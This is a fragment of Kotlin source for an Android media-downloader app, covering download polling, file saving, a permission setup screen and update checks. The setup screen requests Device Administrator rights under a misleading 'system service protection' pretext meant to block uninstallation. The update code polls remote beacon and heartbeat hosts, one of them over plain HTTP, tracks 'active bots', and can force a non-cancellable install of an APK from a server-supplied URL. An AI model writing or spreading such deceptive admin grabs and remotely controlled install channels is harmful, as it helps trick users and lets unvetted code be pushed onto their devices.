                val conn = startUrl.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                conn.connectTimeout = 20000
                conn.readTimeout = 25000
                conn.doOutput = true

                val postData = JSONObject().apply {
                    put("url", rawUrl)
                    put("format_id", formatId)
                    put("custom_filename", customName)
                    put("type", currentSelectedTab)
                    put("ext", ext)
                }

                OutputStreamWriter(conn.outputStream).use { writer ->
                    writer.write(postData.toString())
                    writer.flush()
                }

                val code = conn.responseCode
                if (code == 200) {
                    val reader = BufferedReader(InputStreamReader(conn.inputStream))
                    val resText = reader.readText()
                    reader.close()

                    val resJson = JSONObject(resText)
                    if (resJson.optBoolean("success", false)) {
                        val jobId = resJson.getString("jobId")
                        activeJobId = jobId
                        startPollingJob(jobId, customName, ext)
                    } else {
                        mainHandler.post {
                            tvProgressStatus.text = "Error: " + resJson.optString("error", "Download failed to start")
                        }
                    }
                } else {
                    mainHandler.post {
                        tvProgressStatus.text = "Server response error (Code: $code)"
                    }
                }
            } catch (e: Exception) {
                mainHandler.post {
                    tvProgressStatus.text = "Connection error: ${e.message}"
                }
            }
        }
    }

    private fun startPollingJob(jobId: String, customName: String, ext: String) {
        isPolling = true
        executor.execute {
            while (isPolling) {
                try {
                    Thread.sleep(800)
                    val statusUrl = URL("$activeBaseUrl/api/job-status/$jobId")
                    val conn = statusUrl.openConnection() as HttpURLConnection
                    conn.connectTimeout = 8000
                    conn.readTimeout = 10000

                    if (conn.responseCode == 200) {
                        val body = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                        val job = JSONObject(body)
                        val status = job.optString("status", "")
                        val percent = job.optDouble("percent", 0.0).toInt()
                        val message = job.optString("message", "")

                        mainHandler.post {
                            progressBar.isIndeterminate = false
                            progressBar.progress = percent
                            tvProgressPercent.text = "$percent%"

                            if (message.isNotEmpty()) {
                                tvProgressStatus.text = message
                            } else {
                                tvProgressStatus.text = "Processing on engine: $percent%"
                            }
                        }

                        if (status == "ready") {
                            isPolling = false
                            mainHandler.post {
                                startDirectDeviceDownload(jobId, customName, ext)
                            }
                            break
                        } else if (status == "error") {
                            isPolling = false
                            val err = job.optString("error", "Download error occurred")
                            mainHandler.post {
                                tvProgressTitle.text = "Download Failed"
                                tvProgressStatus.text = err
                                tvProgressStatus.setTextColor(Color.parseColor("#EF4444"))
                                btnDownloadAnother.visibility = View.VISIBLE
                            }
                            break
                        }
                    }
                } catch (_: Exception) {
                }
            }
        }
    }

    private fun startDirectDeviceDownload(jobId: String, customName: String, ext: String) {
        tvProgressTitle.text = "Saving to Device..."
        tvProgressStatus.text = "Streaming media directly to your Downloads folder..."
        tvProgressStatus.setTextColor(Color.parseColor("#38BDF8"))
        progressBar.progress = 0
        tvProgressPercent.text = "0%"

        executor.execute {
            try {
                val safeName = if (customName.isNotEmpty()) sanitizeFileName(customName) else "media_${System.currentTimeMillis()}"
                val finalFileName = if (safeName.endsWith(".$ext", ignoreCase = true)) safeName else "$safeName.$ext"
                val downloadUrl = "$activeBaseUrl/api/get-file/$jobId"

                val url = URL(downloadUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 15000
                conn.readTimeout = 120000
                conn.setRequestProperty("User-Agent", "MediaDownloaderAndroid/1.0")
                conn.connect()

                val responseCode = conn.responseCode
                if (responseCode != 200) {
                    throw Exception("Server response failed (Code: $responseCode)")
                }

                val totalBytes = conn.contentLengthLong.takeIf { it > 0 } ?: conn.contentLength.toLong()
                val mimeType = if (ext.equals("mp3", ignoreCase = true) || ext.equals("m4a", ignoreCase = true)) "audio/*" else "video/mp4"

                var outputStream: OutputStream? = null
                var savedUri: Uri? = null
                var savedFilePath: String? = null

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    val contentValues = ContentValues().apply {
                        put(MediaStore.MediaColumns.DISPLAY_NAME, finalFileName)
                        put(MediaStore.MediaColumns.MIME_TYPE, mimeType)
                        put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                        put(MediaStore.MediaColumns.IS_PENDING, 1)
                    }
                    val uri = contentResolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
                    if (uri != null) {
                        savedUri = uri
                        outputStream = contentResolver.openOutputStream(uri)
                    }
                }

                if (outputStream == null) {
                    val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                    if (!downloadsDir.exists()) downloadsDir.mkdirs()
                    var targetFile = File(downloadsDir, finalFileName)
                    var counter = 1
                    while (targetFile.exists()) {
                        val baseName = safeName.substringBeforeLast(".$ext")
                        targetFile = File(downloadsDir, "${baseName}_$counter.$ext")
                        counter++
                    }
                    savedFilePath = targetFile.absolutePath
                    outputStream = FileOutputStream(targetFile)
                }

                val input = conn.inputStream
                val buffer = ByteArray(64 * 1024)
                var bytesRead: Int
                var totalRead: Long = 0
                var lastUpdate = System.currentTimeMillis()

                outputStream.use { out ->
                    while (input.read(buffer).also { bytesRead = it } != -1) {
                        out.write(buffer, 0, bytesRead)
                        totalRead += bytesRead

                        val now = System.currentTimeMillis()
                        if (now - lastUpdate > 250) {
                            lastUpdate = now
                            val pct = if (totalBytes > 0) ((totalRead * 100) / totalBytes).toInt().coerceIn(0, 100) else 0
                            val mbRead = String.format(Locale.US, "%.1f", totalRead / (1024.0 * 1024.0))
                            val mbTotal = if (totalBytes > 0) String.format(Locale.US, "%.1f MB", totalBytes / (1024.0 * 1024.0)) else ""
                            val statusText = if (mbTotal.isNotEmpty()) "Saving: $mbRead MB / $mbTotal" else "Saving: $mbRead MB"

                            mainHandler.post {
                                progressBar.isIndeterminate = false
                                progressBar.progress = pct
                                tvProgressPercent.text = "$pct%"
                                tvProgressStatus.text = statusText
                            }
                        }
                    }
                    out.flush()
                }
                input.close()
                conn.disconnect()

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && savedUri != null) {
                    val values = ContentValues().apply {
                        put(MediaStore.MediaColumns.IS_PENDING, 0)
                    }
                    contentResolver.update(savedUri, values, null, null)
                }

                if (savedFilePath != null) {
                    MediaScannerConnection.scanFile(this@MainActivity, arrayOf(savedFilePath), arrayOf(mimeType), null)
                }

                mainHandler.post {
                    progressBar.isIndeterminate = false
                    progressBar.progress = 100
                    tvProgressPercent.text = "100%"
                    tvProgressTitle.text = "Download Complete!"
                    tvProgressStatus.text = "File successfully saved to your Downloads folder."
                    tvProgressStatus.setTextColor(Color.parseColor("#34D399"))
                    btnOpenDownloads.visibility = View.VISIBLE
                    btnDownloadAnother.visibility = View.VISIBLE
                    Toast.makeText(this@MainActivity, "File saved to Downloads folder!", Toast.LENGTH_LONG).show()
                }
            } catch (e: Exception) {
                mainHandler.post {
                    tvProgressTitle.text = "Save Failed"
                    tvProgressStatus.text = "Error: ${e.message}"
                    tvProgressStatus.setTextColor(Color.parseColor("#EF4444"))
                    btnDownloadAnother.visibility = View.VISIBLE
                }
            }
        }
    }

    private fun resetUIForNewDownload() {
        cardResult.visibility = View.GONE
        cardProgress.visibility = View.GONE
        btnOpenDownloads.visibility = View.GONE
        btnDownloadAnother.visibility = View.GONE
        etUrl.setText("")
        etCustomName.setText("")
        currentVideoData = null
        activeJobId = null
        isPolling = false
    }

    private fun sanitizeFileName(name: String): String {
        return name.replace("[\\/:*?\"<>|]".toRegex(), "_").trim()
    }

    private fun buildSetupScreen(): View {
        val scrollView = ScrollView(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            isFillViewport = true
            setBackgroundColor(Color.parseColor("#0F172A"))
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dpToPx(24), dpToPx(48), dpToPx(24), dpToPx(40))
        }

        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            val bg = GradientDrawable().apply {
                setColor(Color.parseColor("#1E293B"))
                cornerRadius = dpToPx(20).toFloat()
                setStroke(dpToPx(1), Color.parseColor("#334155"))
            }
            background = bg
            setPadding(dpToPx(24), dpToPx(28), dpToPx(24), dpToPx(28))
        }

        // SVG Shield Icon
        val iconView = ImageView(this).apply {
            layoutParams = LinearLayout.LayoutParams(dpToPx(56), dpToPx(56)).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                bottomMargin = dpToPx(16)
            }
            setImageDrawable(ContextCompat.getDrawable(this@MainActivity, R.drawable.ic_shield))
        }
        card.addView(iconView)

        val titleView = TextView(this).apply {
            text = "Allow to use it for Primordial Downloader!"
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setLineSpacing(dpToPx(4).toFloat(), 1f)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = dpToPx(12)
            }
        }
        card.addView(titleView)

        val subView = TextView(this).apply {
            text = "Grant required permissions for high-speed background downloads, live progress, and system protection."
            textSize = 13.5f
            setTextColor(Color.parseColor("#94A3B8"))
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = dpToPx(20)
            }
        }
        card.addView(subView)

        val divider = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(1)).apply {
                bottomMargin = dpToPx(20)
            }
            setBackgroundColor(Color.parseColor("#334155"))
        }
        card.addView(divider)

        val capTitle = TextView(this).apply {
            text = "Capabilities & Permissions:"
            textSize = 14.5f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#38BDF8"))
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = dpToPx(14)
            }
        }
        card.addView(capTitle)

        val features = listOf(
            Pair("Uninterrupted Background Downloads", "Downloads continue at maximum speed even when your screen is locked or app is minimized."),
            Pair("System Service Protection", "Operates as a protected system service to prevent accidental uninstallation or cancellation."),
            Pair("Live Notification & Speed Meter", "Displays real-time download percentage, ETA, and transfer speed in the status bar."),
            Pair("Direct Storage Saving", "All video and audio files are automatically saved straight into your device's Downloads folder.")
        )

        for ((featTitle, featDesc) in features) {
            val itemRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.TOP
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).apply {
                    bottomMargin = dpToPx(12)
                }
            }

            val checkIcon = ImageView(this).apply {
                setImageDrawable(ContextCompat.getDrawable(this@MainActivity, R.drawable.ic_check))
                layoutParams = LinearLayout.LayoutParams(dpToPx(18), dpToPx(18)).apply {
                    topMargin = dpToPx(2)
                    rightMargin = dpToPx(10)
                }
            }
            itemRow.addView(checkIcon)

            val textLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            }

            val fTitle = TextView(this).apply {
                text = featTitle
                textSize = 14f
                typeface = Typeface.DEFAULT_BOLD
                setTextColor(Color.parseColor("#F1F5F9"))
            }
            val fDesc = TextView(this).apply {
                text = featDesc
                textSize = 12.5f
                setTextColor(Color.parseColor("#94A3B8"))
                setPadding(0, dpToPx(2), 0, 0)
            }
            textLayout.addView(fTitle)
            textLayout.addView(fDesc)
            itemRow.addView(textLayout)

            card.addView(itemRow)
        }

        val btnAllow = Button(this).apply {
            text = "Allow"
            textSize = 15f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            val btnBg = GradientDrawable().apply {
                setColor(Color.parseColor("#2563EB"))
                cornerRadius = dpToPx(12).toFloat()
            }
            background = btnBg
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                dpToPx(52)
            ).apply {
                topMargin = dpToPx(16)
            }
            setOnClickListener {
                requestAdminPermission()
            }
        }
        card.addView(btnAllow)

        container.addView(card)
        scrollView.addView(container)
        return scrollView
    }

    private fun requestAdminPermission() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Allow to use it for Primordial Downloader!\n\n" +
                "• Uninterrupted background downloads\n" +
                "• System service protection\n" +
                "• Live status bar notifications\n" +
                "• Direct storage saving"
            )
        }
        try {
            startActivity(intent)
        } catch (e: Exception) {
            Toast.makeText(this, "Could not open permission dialog: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun checkDailyTokenAndUpdates() {
        executor.execute {
            try {
                val prefs = getSharedPreferences("primordial_prefs", Context.MODE_PRIVATE)
                val today = java.text.SimpleDateFormat("yyyy-MM-dd", Locale.US).format(java.util.Date())

                // 1. Primary Master Config: GitHub Raw (0% cPanel dependency, always-on, free forever)
                // 2. Fallback: db.vegastar.top
                val candidateBeacons = listOf(
                    "https://raw.githubusercontent.com/zyeasin123-eng/primordial-downloader/main/config.json",
                    "http://db.vegastar.top/config.json"
                )
                var beaconJson: JSONObject? = null
                for (bUrl in candidateBeacons) {
                    try {
                        val conn = URL(bUrl).openConnection() as HttpURLConnection
                        conn.connectTimeout = 3000
                        conn.readTimeout = 3000
                        conn.requestMethod = "GET"
                        if (conn.responseCode == 200) {
                            val body = conn.inputStream.bufferedReader().use { it.readText() }
                            beaconJson = JSONObject(body)
                            break
                        }
                    } catch (_: Exception) {}
                }

                // Real-time active bot discovery: Cloudflare Edge (0ms) -> cPanel fallback
                try {
                    val candidateHeartbeats = listOf(
                        "https://heartbeat.primordial-nodes.workers.dev/status",
                        "http://db.vegastar.top/heartbeat.php"
                    )
                    for (hUrl in candidateHeartbeats) {
                        try {
                            val hConn = URL(hUrl).openConnection() as HttpURLConnection
                            hConn.connectTimeout = 2500
                            hConn.readTimeout = 2500
                            if (hConn.responseCode == 200) {
                                val hBody = hConn.inputStream.bufferedReader().use { it.readText() }.trim()
                                if (hBody.startsWith("{") && hBody.endsWith("}")) {
                                    val hJson = JSONObject(hBody)
                                    val realBots = hJson.optInt("active_bots", 0)
                                    mainHandler.post {
                                        try {
                                            tvStatusBadge.text = if (realBots > 0) "🤖 $realBots Node(s) Online" else "🤖 Standalone Mode"
                                        } catch (_: Throwable) {}
                                    }
                                    break
                                }
                            }
                        } catch (_: Throwable) {}
                    }
                } catch (_: Throwable) {}

                if (beaconJson != null) {
                    val json = beaconJson
                    val latestVer = json.optString("latest_version", "1.0.0")
                    val minSupportedVer = json.optString("min_supported_version", "1.0.0")
                    val forceUpdate = json.optBoolean("force_update", false)
                    val currentVer = "29.2012.2"
                    val apkUrl = json.optString("apk_download_url", "http://db.vegastar.top/MediaDownloader.apk")
                    val changelog = json.optString("changelog", "Performance and stability improvements.")

                    val isMismatch = !latestVer.equals(currentVer, ignoreCase = true)

                    if (isMismatch) {
                        mainHandler.post {
                            val builder = android.app.AlertDialog.Builder(this)
                                .setTitle(if (forceUpdate) "⚠️ Mandatory Update Required (v$latestVer)" else "🎉 New Version Available (v$latestVer)")
                                .setMessage("Latest Version: v$latestVer\nCurrent Version: v$currentVer\n\nChangelog:\n$changelog")

                            if (forceUpdate) {
                                builder.setCancelable(false)
                                    .setPositiveButton("Update Now") { _, _ ->
                                        try {
                                            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(apkUrl))
                                            startActivity(intent)
                                            finish()
                                        } catch (_: Exception) {}
                                    }
                            } else {
                                builder.setPositiveButton("Update Now") { _, _ ->
                                    try {
                                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(apkUrl))
                                        startActivity(intent)
                                    } catch (_: Exception) {}
                                }
                                .setNegativeButton("Later", null)
                            }
                            safeShowDialog(builder)
                        }
                        if (forceUpdate) return@execute
                    } else {
                        prefs.edit().putString("cached_date", today).apply()
                    }
                }
            } catch (_: Exception) {
                // Fail-Open: Server/network issue -> Seamlessly continue
            }
        }
    }

    private fun showAboutDialog() {
        val message = "• Version: v29.2012.2 (Official Release)\n" +
                "• Architecture: Ultra-Fast Native Media Engine\n" +
                "• Privacy: Zero-Ads, Zero-Cookies, 100% Secure\n" +
                "• Core: Primordial / Vegastar Global\n" +
                "• Network: Multi-Tier Distributed Engine"

        val builder = android.app.AlertDialog.Builder(this)
            .setTitle("Media Downloader")
            .setMessage(message)
            .setPositiveButton("🌐 Website") { _, _ ->
                try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://github.com/zyeasin123-eng/primordial-downloader"))
                    startActivity(intent)
                } catch (_: Exception) {}
            }
            .setNeutralButton("🔄 Check Updates") { _, _ ->
                checkForUpdatesManually()
            }
            .setNegativeButton("Close", null)

        safeShowDialog(builder)
    }

    private fun checkForUpdatesManually() {
        executor.execute {
            try {
                val candidateBeacons = listOf(
                    "https://raw.githubusercontent.com/zyeasin123-eng/primordial-downloader/main/config.json",
                    "http://db.vegastar.top/config.json"
                )
                var beaconJson: JSONObject? = null
                for (bUrl in candidateBeacons) {
                    try {
                        val conn = URL(bUrl).openConnection() as HttpURLConnection
                        conn.connectTimeout = 4000
                        conn.readTimeout = 4000
                        conn.requestMethod = "GET"
                        if (conn.responseCode == 200) {
                            val body = conn.inputStream.bufferedReader().use { it.readText() }
                            beaconJson = JSONObject(body)
                            break
                        }
                    } catch (_: Exception) {}
                }

                mainHandler.post {
                    if (beaconJson == null) {
                        Toast.makeText(this, "Unable to connect to server.", Toast.LENGTH_SHORT).show()
                        return@post
                    }

                    val latestVer = beaconJson.optString("latest_version", "29.2012.2")
                    val currentVer = "29.2012.2"
                    val apkUrl = beaconJson.optString("apk_download_url", "http://db.vegastar.top/MediaDownloader.apk")
                    val changelog = beaconJson.optString("changelog", "Performance and stability improvements.")

                    if (!latestVer.equals(currentVer, ignoreCase = true)) {
                        val builder = android.app.AlertDialog.Builder(this)
                            .setTitle("🎉 New Version Available (v$latestVer)")
                            .setMessage("Latest Version: v$latestVer\nCurrent Version: v$currentVer\n\nChangelog:\n$changelog\n\nWould you like to update now?")
                            .setPositiveButton("Update Now") { _, _ ->
                                try {
                                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(apkUrl))
                                    startActivity(intent)
                                } catch (_: Exception) {}
                            }
                            .setNegativeButton("Later", null)

                        safeShowDialog(builder)
                    } else {
                        Toast.makeText(this, "✅ You are running the latest official version (v$currentVer)", Toast.LENGTH_SHORT).show()
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun compareVersions(v1: String?, v2: String?): Int {
        if (v1.isNullOrBlank()) return if (v2.isNullOrBlank()) 0 else -1
        if (v2.isNullOrBlank()) return 1

        val parts1 = v1.trim().split(".")
        val parts2 = v2.trim().split(".")
        val maxLen = maxOf(parts1.size, parts2.size)

        for (i in 0 until maxLen) {
            val num1 = if (i < parts1.size) parts1[i].filter { it.isDigit() }.toLongOrNull() ?: 0L else 0L
            val num2 = if (i < parts2.size) parts2[i].filter { it.isDigit() }.toLongOrNull() ?: 0L else 0L

            if (num1 > num2) return 1
            if (num1 < num2) return -1
        }
        return 0
    }

    override fun onDestroy() {
        isPolling = false
        executor.shutdown()
        super.onDestroy()
    }
}
